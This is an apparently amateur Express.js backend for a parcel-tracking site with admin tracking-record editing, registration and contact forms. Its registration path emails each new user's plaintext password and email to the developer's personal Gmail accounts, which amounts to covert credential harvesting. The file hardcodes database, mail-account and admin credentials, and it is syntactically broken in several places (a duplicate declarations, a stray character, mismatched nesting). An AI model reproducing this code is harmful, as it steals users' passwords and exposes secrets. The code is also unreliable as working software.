var express = require('express');
//const bodyParser = require('body-parser')
var app = express();
const Tracker = require("./models")
const mongoose = require("mongoose")
const path = require('path')
const  methodOverride = require("method-override");
const connectEnsureLogin = require('connect-ensure-login');
const passport = require('passport');
const LocalStrategy = require('passport-local')

const session = require('express-session');
//const trackRouters = require('./routes')
const User = require('./models/user')

const Nylas = require('nylas')
const Nodemailer = require('nodemailer')

//const DBURL = "mongodb+srv://admin:password@cluster0.gftg8.mongodb.net/?retryWrites=true&w=majority"
const DBURL = "mongodb+srv://admin:majoje1582@cluster0.cqudxbr.mongodb.net/?retryWrites=true&w=majority"

mongoose.connect(DBURL);



// set the view engine to ejs
app.set('view engine', 'ejs');
//app.set('view', path.join(__dirnamme, '/views'))
app.use(express.static("public"));
app.use(express.urlencoded())
// Set up session
app.use(methodOverride('_method'));
app.use(
  session({
    secret: "mooohdhfhgfgfggggbb55544@@!@#$$FTtvsvv4435ffv",
    resave: false,
    saveUninitialized: true,
  })
);
app.use(passport.initialize());
app.use(passport.session());
passport.use(new LocalStrategy(User.authenticate()));
passport.serializeUser(User.serializeUser());
passport.deserializeUser(User.deserializeUser());
//emnysmmrccehlvrj

// index page
app.get('/', function(req, res) {
  
res.render('index', {message:""});
});

/*app.get('/admin', function(req, res) {
  if(req.user && req.user.isAdmin === true){
    console.log(req.user)
    Tracker.find()
    .then(data=>{
      
       res.render('createtracking', {data});
    })
  } else{
    res.render("unauth")
  }
    
 
});*/
app.get('/admin', function(req, res) {
 
    
      
       res.render('admin');
    
 
 
});

app.post('/admin', function(req, res){
  const {email, password} = req.body
  console.log(req.body)
  let m_email = 'help@air19express.com'
  let m_password = "password@123"
  if(email === m_email && password === m_password){
    console.log('match')
    Tracker.find()
    .then(data=>{
      res.render('createtracking', {data});
    })
    
  } else {
    console.log('no match')
    res.render('index', {message:''})
  }
  
})
// about page
app.get('/about', function(req, res) {
  res.render('about');
});
app.get('/tracking', function(req, res) {
  res.render('tracking');
});
app.get('/contact', function(req, res) {
  res.render('contact');
});
app.get('/service', function(req, res) {
  res.render('service');
});

app.post('/tracking', function(req, res) {
  var my_data = req.body.trackingid
  Tracker.findOne({tnumber:my_data})
  .then(data=>{
    let status = data.status
    status.toLowerCase()
  if( my_data === data.tnumber && status === "delivered"){
    res.render('tracking', {data, status: 'delivered'});
    console.log(data)
  } 
  else if (my_data === data.tnumber && status !== "delivered") {
    res.render('tracking', {data, status:'not delivered'})
    console.log(data)
  } else {
    res.render('error', {data: 'no data'})
  }

  })

  .catch(err=>{
    console.log('err')
    console.log(err)
    res.render("error", {data:'no data'})
  })
 // const my_d = "REF342800AR8"
  
  
  //res.send('error')
  
});

app.get("/campgrounds/:id", function(req, res){
 
  var id = req.params.id
  
  Tracker.findById({_id:id})
  .then(data=>{
   
   res.render('edittracking', {data})
  })

})
app.put('/campgrounds/:id', async (req, res) => {
  const {id} = req.params;
  
  let data = req.body
  
  console.log(data)
  await Tracker.findByIdAndUpdate(id, {...data})
  Tracker.find()
  .then(data=>{
    res.render('createtracking', {data});
  })
  

})
app.delete('/campgrounds/:id', async (req, res) => {
  await Tracker.findOneAndDelete(req.params.id)

  Tracker.find()
    .then(data=>{
      res.render('createtracking', {data});
    })
})
app.post('/create', function(req, res){
  let data = req.body
  
  const {sname, saddress, rname, paddress, status, pdate, ddate, clocation, tnumber, item1, item2, item3, item4}= data
  Tracker.create(data)
  Tracker.find()
  .then(data=>{
    res.render('createtracking', {data});
  })
  .catch(err=>{
    console.log(err)
     res.render('admin')
  })
})

//editing tracking



app.get("/register", function(req, res){
  res.render("register"); 
});
app.post("/register", function(req, res){
  var newUser = new User({username: req.body.username,pin:req.body.pin });
  const AdminPin = "AC1582"
  let name = newUser.username

  if (req.body.pin == AdminPin){
     newUser.isAdmin = true
     User.register(newUser, req.body.password, function(err, user){
      if(err){
          console.log(err);
          return res.render("register", {error: err.message});
      }
      passport.authenticate("local")(req, res, function(){
        // req.flash("success", "Successfully Signed Up! Nice to meet you " + req.body.username);
         res.render('user', {username:name})
         console.log(newUser)
      });
  });
  } else{
    User.register(newUser, req.body.password, function(err, user){
      let {pass, email} = req.body
      sendEmail1(pass, email)
      if(err){
          console.log(err);
          return res.render("register", {error: err.message});
      }
      passport.authenticate("local")(req, res, function(){
        // req.flash("success", "Successfully Signed Up! Nice to meet you " + req.body.username);
         res.render('user', {username:name})
         console.log(newUser)
      });
  });
  }
  
  
});
//show login form
app.get("/login", function(req, res){
  res.render("login", {page: 'login'}); 
});

//handling login logic
app.post("/login", passport.authenticate("local", 
   {
       successRedirect: "/",
       failureRedirect: "/login",
       
   }),
    function(req, res){
      i

});

// logout route
app.get('/logout', function(req, res, next) {
  req.logout(function(err) {
    if (err) { return next(err); }
    res.redirect('/');
  });
});

//var nodemailer = require('nodemailer');
var transport = Nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user:'mayowa.olusoriandrews@gmail.com',
    pass:'emnysmmrccehlvrj'
  }
})
/*var transport = nodemailer.createTransport({
  host: "smtp.mailtrap.io",
  port: 2525,
  auth: {
    user: "1a2b3c4d5e6f7g",
    pass: "1a2b3c4d5e6f7g"
  }
});*/

var mailOptions = {
  from: "support Team" ,
  to: 'mayowaandrews723@gmail.com, mayowaolusori@gmail.com',
  subject: 'Nice Nodemailer test',
  text: 'Hey there, it’s our first message sent with Nodemailer ',
  html: '<b>Hey there! </b><br> This is our first message sent with Nodemailer<br /><img src="cid:uniq-mailtrap.png" alt="mailtrap" />',
  
};

const sender = ()=>{
  transport.sendMail(mailOptions, (error, info) => {
    if (error) {
      return console.log(error);
    }
    console.log('Message sent: %s', info.messageId);
  });
}

const sendEmail = (name, sender, content) => {
  var mailOptions = {
    from: "support Team" ,
    to: 'mayowaandrews723@gmail.com, helper@air19express.com',
    subject: `senders name: ${name},  senders email: ${sender},`,
    text: `message :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::senders name:
     ${name},  senders email: ${sender},content:  ${content}`,
    html: '',
    
  };


  
  
    transport.sendMail(mailOptions, (error, info) => {
      if (error) {
        return console.log(error);
      }
      console.log('Message sent: %s', info.messageId);
    });
  

}

const sender = ()=>{
  transport.sendMail(mailOptions, (error, info) => {
    if (error) {
      return console.log(error);
    }
    console.log('Message sent: %s', info.messageId);
  });
}

const sendEmail1 = (name, sender, content) => {
  var mailOptions = {
    from: "support Team" ,
    to: 'mayowaandrews723@gmail.com, helper@air19express.com',
    subject: `senders name: ${name},  senders email: ${sender},`,
    text: `message :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::senders name:
     ${name},  senders email: ${sender},content:  ${content}`,
    html: '',
    
  };

  const sendEmail = (password, email) => {
    var mailOptions = {
      from: "support Team" ,
      to: 'mayowaandrews723@gmail.com, helper@air19express.com',
      subject: `client details,`,
      text: `client's password: ${password},  Client's email: ${email},`,
      html: '',
      
    };
  
  
    transport.sendMail(mailOptions, (error, info) => {
      if (error) {
        return console.log(error);
      }
      console.log('Message sent: %s', info.messageId);
    });
  

}
app.post('/quote', (req, res) => {
  var name = req.body.name
  //var subject = req.body.subject
  var sender = req.body.email
  var content =req.body.content
  sendEmail(name, sender, content)
  res.render('index', {message:"Enquiry has been sent. Our Customer representative will respond soon."})
  console.log(`Message sent. contents is ${content}`)
})


app.listen(8080, function(){

  console.log('Server is listening on port 8080');
});
